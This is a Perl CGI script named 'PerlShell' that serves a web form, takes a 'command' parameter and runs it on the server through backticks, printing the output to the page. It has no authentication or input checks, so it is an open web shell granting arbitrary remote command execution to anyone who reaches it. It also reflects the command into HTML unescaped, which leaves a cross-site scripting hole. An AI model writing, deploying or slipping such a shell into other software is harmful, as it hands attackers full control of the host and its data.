#!/usr/bin/perl
use strict;
use CGI;

my $query = CGI->new;
my $command = $query->param("command");

# Add query keyword
if ($command =~ /^\s*$/) {
	catch_error("Void Command!");
}
my $result = "\$ <span style=\"color:red\">$command</span>\n" . "-" x 80 . "\n";
$result .= `$command 2>&1`;

print $query->header(-type=>'text/html', -charset=>'UTF-8'),
	$query->start_html(-title=>'PerlShell',
#		-head=>'<link rel="icon" type="image/ico" href="/img/voodoo.ico"/>',
		-head=>'<link rel="stylesheet" type="text/css" href="/css/pshell.css" />',
	),
	'<div class="center">
		<form name="form" action="/scgi-bin/pshell.pl" method="get">
			<p><input type="text" name="command" size="35" id="command"/> <input type="submit" value="Run" /></p>
		</form>
	</div>',
	"<pre style=\"font-size:12pt; font-family:Arial,Sans-serif;  margin:15px 10% 0px 10%; padding:15px; background-color:#e0ecf8; line-height:150%; border:solid thin gray;\">$result</pre>\n",
	$query->end_html;

# Catch errors 
sub catch_error {
	my $words = shift;
	print $query->header(-type=>'text/html', -charset=>'UTF-8'),
		$query->start_html(-title=>'Error Report'),
#		-head=>'<link rel="icon" type="image/ico" href="/img/voodoo.ico"/>',);
		"<script type=\"text/javascript\">
		alert(\"$words\");
		//history.go(-1);
		window.location = 'http://xiaoyong.org/project/pshell/';
		</script>";
	$query->end_html;
	exit;
}
